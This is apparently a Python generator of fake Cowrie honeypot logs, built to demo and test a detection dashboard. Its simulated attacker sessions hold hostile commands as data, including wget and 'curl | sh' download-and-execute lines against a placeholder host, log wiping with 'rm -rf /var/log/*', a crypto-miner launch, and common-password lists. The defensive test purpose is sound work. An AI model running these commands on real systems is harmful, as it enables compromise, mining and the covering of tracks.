"""Fake-but-realistic Cowrie logs for demos and tests.

Why: during a presentation you cannot count on real attackers showing up. This script
writes a log in the same JSON format Cowrie produces, containing several attack stories
that trigger every detection rule, and a small file with illustrative locations.

All public-looking IPs are RESERVED DOCUMENTATION ADDRESSES (RFC 5737: 192.0.2.x,
198.51.100.x, 203.0.113.x). They belong to nobody, and the countries/cities assigned to
them below are made up for the demo. 192.168.56.20 plays the attacker VM of the lab.

    python -m demo.generate_demo               # writes data/demo/cowrie.json + demo_geo.json
    python run.py demo                         # generate + analyse + open the dashboard
"""
import argparse
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

COMMON = ["123456", "password", "admin", "qwerty", "letmein", "12345678", "root", "toor",
          "1234", "welcome", "abc123", "111111", "raspberry", "ubnt", "test", "changeme"]

GEO = {   # illustrative only
    "203.0.113.10": ("China", "CN", "Beijing", 39.90, 116.40),
    "203.0.113.25": ("Russia", "RU", "Moscow", 55.75, 37.62),
    "198.51.100.7": ("Brazil", "BR", "Sao Paulo", -23.55, -46.63),
    "198.51.100.44": ("India", "IN", "Mumbai", 19.08, 72.88),
    "198.51.100.45": ("Nigeria", "NG", "Lagos", 6.52, 3.38),
    "198.51.100.46": ("Vietnam", "VN", "Hanoi", 21.03, 105.85),
    "198.51.100.47": ("Netherlands", "NL", "Amsterdam", 52.37, 4.90),
    "192.0.2.88": ("South Korea", "KR", "Seoul", 37.57, 126.98),
    "192.0.2.77": ("Indonesia", "ID", "Jakarta", -6.21, 106.85),
    "192.0.2.99": ("United States", "US", "Ashburn", 39.04, -77.49),
    "192.0.2.150": ("Canada", "CA", "Toronto", 43.65, -79.38),
    "192.0.2.151": ("Germany", "DE", "Berlin", 52.52, 13.40),
    "192.0.2.152": ("Australia", "AU", "Sydney", -33.87, 151.21),
    "192.0.2.153": ("South Africa", "ZA", "Johannesburg", -26.20, 28.05),
    "192.0.2.154": ("Turkey", "TR", "Istanbul", 41.01, 28.98),
}
LAN_ATTACKER = "192.168.56.20"      # the attacker VM in the two-machine lab (no map location)


def geo_records() -> dict:
    return {ip: {"country": c, "country_code": cc, "city": city, "lat": lat, "lon": lon}
            for ip, (c, cc, city, lat, lon) in GEO.items()}


class _Log:
    def __init__(self, seed):
        self.rng = random.Random(seed)
        self.rows = []                                   # (time, json line)

    def _sid(self):
        return "%012x" % self.rng.getrandbits(48)

    def _emit(self, t, eventid, ip, sid, **fields):
        stamp = t.strftime("%Y-%m-%dT%H:%M:%S.") + "%06dZ" % self.rng.randint(0, 999999)
        data = {"eventid": eventid, **fields, "src_ip": ip, "session": sid,
                "sensor": "honeypot-demo", "timestamp": stamp}
        self.rows.append((t, json.dumps(data)))

    def session(self, ip, start, attempts, commands=(), gap=1.5, cmd_gap=3.0):
        """One SSH connection: connect, login attempts [(user, pw, ok)], commands, close."""
        sid, t = self._sid(), start
        self._emit(t, "cowrie.session.connect", ip, sid, src_port=self.rng.randint(30000, 60000),
                   dst_port=2222, protocol="ssh", message="New connection")
        logged_in = False
        for user, pw, ok in attempts:
            t += timedelta(seconds=gap)
            ev = "cowrie.login.success" if ok else "cowrie.login.failed"
            word = "succeeded" if ok else "failed"
            self._emit(t, ev, ip, sid, username=user, password=pw,
                       message=f"login attempt [{user}/{pw}] {word}")
            logged_in = logged_in or ok
        if logged_in:
            for cmd in commands:
                t += timedelta(seconds=cmd_gap)
                self._emit(t, "cowrie.command.input", ip, sid, input=cmd, message=f"CMD: {cmd}")
        t += timedelta(seconds=1)
        self._emit(t, "cowrie.session.closed", ip, sid,
                   duration=round((t - start).total_seconds(), 2), message="Connection lost")
        return t

    def bruteforce(self, ip, start, creds, per_session=3, gap=0.8, between=1.5):
        t = start
        for i in range(0, len(creds), per_session):
            chunk = [(u, p, False) for u, p in creds[i:i + per_session]]
            t = self.session(ip, t, chunk, gap=gap) + timedelta(seconds=between)
        return t


def build_log(now=None, seed=7):
    """Returns (list of JSON lines sorted by time, list of attacker IPs)."""
    now = now or datetime.now(timezone.utc)
    L, rng = _Log(seed), random.Random(seed + 1)
    users = ["root", "admin", "user", "ubuntu", "pi", "test", "oracle", "postgres"]
    ago = lambda **kw: now - timedelta(**kw)             # noqa: E731

    # 1. Beijing: loud wordlist brute force -> brute_force, rapid_attack, dictionary_attack
    creds = [(rng.choice(["root", "admin"]), rng.choice(COMMON)) for _ in range(36)]
    L.bruteforce("203.0.113.10", ago(hours=5, minutes=12), creds)

    # 2. Moscow: one password sprayed over many usernames -> password_spraying, enumeration
    L.bruteforce("203.0.113.25", ago(hours=3, minutes=40),
                 [(u, "Summer2026!") for u in users], per_session=4, gap=2)

    # 3. Sao Paulo: slow and persistent over many hours -> repeated_attacks
    for h in (31, 22, 13, 4):
        L.bruteforce("198.51.100.7", ago(hours=h),
                     [("root", p) for p in ("zxcvbn", "hunter", "monkey", "dragon")],
                     gap=12, between=20)

    # 4. Botnet: four IPs share the same credentials in the same 10-minute period
    #    -> distributed_attack (aligned to the detector's 600 s window)
    base = ago(hours=8)
    base = base.replace(minute=base.minute // 10 * 10, second=45, microsecond=0)
    shared = [("root", "123456"), ("admin", "admin"), ("pi", "raspberry"), ("ubnt", "ubnt")]
    for k, ip in enumerate(["198.51.100.44", "198.51.100.45", "198.51.100.46", "198.51.100.47"]):
        L.bruteforce(ip, base + timedelta(seconds=40 * k), shared, per_session=4, gap=1.2)

    # 5. Seoul: guesses a password, gets in, downloads and runs malware, wipes traces
    #    -> success_after_failures (critical), download_and_execute (critical), suspicious_commands
    t = L.bruteforce("192.0.2.88", ago(hours=2, minutes=5),
                     [("root", p) for p in ("root", "toor", "123456", "password", "admin", "qwerty")])
    L.session("192.0.2.88", t, [("root", "Passw0rd#1", True)], cmd_gap=4, commands=[
        "uname -a", "whoami", "cat /etc/passwd", "cd /tmp",
        "wget http://198.51.100.250/bins/x86_64", "chmod 777 x86_64", "./x86_64",
        "rm -rf /var/log/*", "history -c"])

    # 6. Jakarta: crypto-miner installation
    t = L.bruteforce("192.0.2.77", ago(hours=1, minutes=20), [("ubuntu", "ubuntu"), ("ubuntu", "123456")])
    L.session("192.0.2.77", t, [("ubuntu", "ubuntu1", True)], cmd_gap=5, commands=[
        "nproc", "curl -s http://198.51.100.250/m.sh | sh",
        "./xmrig -o stratum+tcp://pool.example.invalid:3333 -u wallet"])

    # 7. Ashburn: scanner, many connections that never try to log in -> connection_flood
    t = ago(minutes=50)
    for i in range(28):
        L.session("192.0.2.99", t + timedelta(seconds=i * 1.4), [], gap=0)

    # 8. The lab: the attacker VM runs a hydra-style attack, then logs in and looks around
    t = L.bruteforce(LAN_ATTACKER, ago(minutes=25),
                     [("root", p) for p in COMMON * 2], per_session=3, gap=0.3, between=0.4)
    L.session(LAN_ATTACKER, t, [("root", "alpine", True)], cmd_gap=3,
              commands=["whoami", "id", "uname -a", "ls -la /root"])

    # 9. background noise: a few one-off failed logins from elsewhere
    for ip in ("192.0.2.150", "192.0.2.151", "192.0.2.152", "192.0.2.153", "192.0.2.154"):
        for _ in range(rng.randint(1, 3)):
            L.session(ip, ago(hours=rng.randint(1, 30), minutes=rng.randint(0, 59)),
                      [(rng.choice(users), rng.choice(COMMON), False)])

    L.rows.sort(key=lambda r: r[0])
    return [line for _, line in L.rows], sorted(set(json.loads(l)["src_ip"] for _, l in L.rows))


def write_demo_files(dest, now=None, seed=7):
    dest = Path(dest)
    dest.mkdir(parents=True, exist_ok=True)
    lines, _ = build_log(now, seed)
    (dest / "cowrie.json").write_text("\n".join(lines) + "\n")
    (dest / "demo_geo.json").write_text(json.dumps(geo_records(), indent=2))
    return dest / "cowrie.json", dest / "demo_geo.json"


def prepare_demo(dest="data/demo", now=None, seed=7) -> dict:
    """Write the fake log, load it into a fresh demo database and run the analysis."""
    from collector.ingest import run as ingest_run
    from database.db import init_db
    from detection.detector import run_detection
    from geo.geolocate import enrich, seed_geo

    dest = Path(dest)
    log_path, geo_path = write_demo_files(dest, now, seed)
    db, state = dest / "demo.db", dest / "collector_state.json"
    for stale in (db, state):
        stale.unlink(missing_ok=True)
    init_db(db)
    seed_geo(json.loads(geo_path.read_text()), db)
    ingested = ingest_run(log_path, state, db)
    detected = run_detection(db)
    located = enrich(db)                     # classifies the lab VM as a private network
    return {"db": db, "log": log_path, "ingest": ingested, "detect": detected, "geo": located}


def main():
    parser = argparse.ArgumentParser(description="Write a fake Cowrie log for demos")
    parser.add_argument("--out", default="data/demo", help="folder to write into")
    parser.add_argument("--seed", type=int, default=7)
    args = parser.parse_args()
    log_path, geo_path = write_demo_files(args.out, seed=args.seed)
    print(f"Wrote {log_path} and {geo_path}")


if __name__ == "__main__":
    main()
